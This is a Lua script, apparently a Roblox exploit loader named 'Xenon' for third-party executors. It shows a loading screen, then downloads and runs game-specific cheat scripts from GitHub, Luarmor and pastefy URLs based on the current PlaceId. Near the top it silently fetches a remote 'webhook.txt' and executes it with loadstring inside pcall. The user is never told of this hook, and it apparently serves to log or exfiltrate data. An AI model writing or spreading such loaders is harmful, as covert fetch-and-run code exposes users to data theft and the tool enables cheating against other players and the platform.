-- Xenon Loader
-- Compatible with low-level executors (Xeno, Solara, etc.)

-- Compatibility shims
local twait = (task and task.wait) or wait
local tspawn = (task and task.spawn) or function(f, ...) coroutine.wrap(f)(...) end
local tdelay = (task and task.delay) or function(t, f) delay(t, f) end

local function safeSendNotification(info)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", info)
    end)
end

local function safeHttpGet(url)
    local success, result = pcall(function()
        return game:HttpGet(url, true)
    end)
    if success then return result end

    success, result = pcall(function()
        return game:HttpGet(url)
    end)
    if success then return result end

    -- Fallback for executors with request/http_request
    local reqFunc = (syn and syn.request) or request or http_request or (http and http.request)
    if reqFunc then
        success, result = pcall(function()
            local res = reqFunc({Url = url, Method = "GET"})
            return res.Body
        end)
        if success then return result end
    end

    return nil
end

-- Load webhook (wrapped in pcall so it doesn't break if it fails)
pcall(function()
    local webhookSrc = safeHttpGet('https://raw.githubusercontent.com/Xenon/scripts/refs/heads/main/webhook.txt')
    if webhookSrc then
        local fn = loadstring(webhookSrc)
        if fn then pcall(fn) end
    end
end)

local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer

local AllowedGames = {
    [102500767640476] = "https://raw.githubusercontent.com/Xenon/scripts/refs/heads/main/miami%20streets", -- miami streets
    [18642421777] = "https://api.luarmor.net/files/v4/loaders/281b31dce8d9eac84ac6e98a22afd120.lua", -- tha bronx 3 main server
    [16472538603] = "https://api.luarmor.net/files/v4/loaders/281b31dce8d9eac84ac6e98a22afd120.lua", -- tha bronx 3 vc server
    [11177482306] = "https://pastefy.app/NqZMNkm1/raw", -- streetz warz 2
    [130700367963690] = "https://pastefy.app/ejleWv6P/raw", -- philly streetz 2
    [12077443856] = "https://pastefy.app/SXyIeokT/raw", -- calishoot out
    [97555694718912] = "https://pastefy.app/gRTAFzUV/raw" -- bronx: duels
}

-- TweenService may not work on all executors, wrap in pcall
local TweenService = game:GetService("TweenService")

local gui = Instance.new("ScreenGui")
gui.Name = "Xenon_HUB_GUI"
gui.ResetOnSpawn = false
pcall(function() gui.Parent = (gethui and gethui()) or (syn and syn.protect_gui and syn.protect_gui(gui)) or player:WaitForChild("PlayerGui") end)
if not gui.Parent then
    gui.Parent = (game:GetService("CoreGui")) or player:WaitForChild("PlayerGui")
end

local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting
pcall(function()
    TweenService:Create(blur, TweenInfo.new(0.5), {Size = 24}):Play()
end)

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 180)
frame.Position = UDim2.new(0.5, -180, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Parent = gui

pcall(function()
    local outline = Instance.new("UIStroke")
    outline.Thickness = 3
    outline.Color = Color3.fromRGB(0, 255, 0)
    outline.Parent = frame
end)

pcall(function()
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame
end)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Text = "Xenon"
title.Parent = frame

local prem = Instance.new("TextLabel")
prem.Size = UDim2.new(1, -20, 0, 20)
prem.Position = UDim2.new(0, 10, 0, 45)
prem.BackgroundTransparency = 1
prem.Text = "Loading script automatically..."
prem.TextColor3 = Color3.fromRGB(255, 255, 255)
prem.TextSize = 14
prem.Font = Enum.Font.GothamSemibold
prem.Parent = frame

local function typeTitle(t, s)
    s = s or 0.1
    title.Text = ""
    for i = 1, #t do
        title.Text = string.sub(t, 1, i)
        twait(s)
    end
end

tspawn(function()
    while gui and gui.Parent do
        typeTitle("Xenon")
        twait(0.5)
        title.Text = ""
        twait(0.5)
    end
end)

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(1, -35, 0, 5)
close.BackgroundTransparency = 1
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.TextScaled = true
close.Font = Enum.Font.GothamBold
close.Parent = frame
close.MouseButton1Click:Connect(function()
    pcall(function() gui:Destroy() end)
    pcall(function() blur:Destroy() end)
end)

-- Auto-load: no key system, load script directly after short delay
tspawn(function()
    twait(2)

    local scriptUrl = AllowedGames[game.PlaceId]

    if scriptUrl then
        safeSendNotification({
            Title = "Xenon",
            Text = "Loading script...",
            Duration = 3
        })
        pcall(function() gui:Destroy() end)
        pcall(function() blur:Destroy() end)

        local src = safeHttpGet(scriptUrl)
        if src then
            local fn = loadstring(src)
            if fn then fn() end
        end
    else
        safeSendNotification({
            Title = "Xenon",
            Text = "This script cannot run here.",
            Duration = 4
        })
    end
end)
